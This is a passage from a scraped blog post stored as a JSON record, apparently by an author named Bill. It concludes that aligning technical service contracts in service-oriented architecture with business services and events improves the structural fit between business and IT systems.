/><br />In conclusion, the way in which business services are manifested in terms of IT systems depends on the flavour of SOA chosen. By aligning our technical service contracts with business services and business events we achieve considerably better structural alignment between the business and the IT systems that support it.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/IBou74EiLjA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1316}}
